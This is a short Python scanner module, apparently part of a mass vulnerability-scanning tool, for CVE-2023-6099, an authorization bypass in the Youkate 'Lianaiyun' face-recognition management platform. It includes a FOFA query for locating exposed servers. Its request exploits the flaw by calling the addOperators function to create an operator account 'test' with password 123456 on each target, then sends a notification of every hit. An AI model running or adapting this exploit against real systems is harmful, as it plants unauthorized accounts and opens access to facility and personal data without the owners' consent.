from Common.Common_Request import common_request
from Modules import ServerJ


class Basic_information:
    no = 109,
    bugName = "优卡特脸爱云一脸通智慧管理平台权限绕过漏洞(CVE-2023-6099)"
    Asset_search = {'fofa': 'title=="欢迎使用脸爱云 一脸通智慧管理平台"'}


def scan_yikatong_ailianyun(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/SystemMng.ashx"
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "*/*",
        "Accept-Language": "en",
        "Connection": "close",
    }
    data = '''operatorName=test&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators'''

    response = common_request(url, path, headers, data=data, method='POST', timeout=20, proxies=proxies,
                              append_to_output=append_to_output)
    if response is not None:
        if response.status_code == 200:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
